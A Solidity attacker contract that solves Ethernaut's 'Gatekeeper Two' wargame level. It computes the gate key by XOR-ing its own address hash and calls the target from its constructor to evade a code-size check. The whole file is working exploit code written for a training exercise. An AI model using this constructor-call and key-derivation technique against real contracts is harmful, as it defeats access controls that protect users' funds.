// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import { Ownable2Step } from "@openzeppelin-contracts/access/Ownable2Step.sol";
import { IGatekeeperTwo } from "ethernaut/14-gatekeeper-two/IGatekeeperTwo.sol";

contract GatekeeperTwoAttacker is Ownable2Step {
    constructor(address _gatekeeperTwoAddr) {
        bytes8 gateKey = _calculteGateKey();
        _exploit(_gatekeeperTwoAddr, gateKey);
    }

    function _calculteGateKey() internal view returns (bytes8) {
        return bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
    }

    function _exploit(address _gatekeeperTwoAddr, bytes8 _gateKey) internal onlyOwner returns (bool) {
        // NB: minimalistic version
        // solhint-disable-next-line avoid-low-level-calls
        (bool success,) = _gatekeeperTwoAddr.call(abi.encodeCall(IGatekeeperTwo.enter, (_gateKey)));
        return success;
    }
}
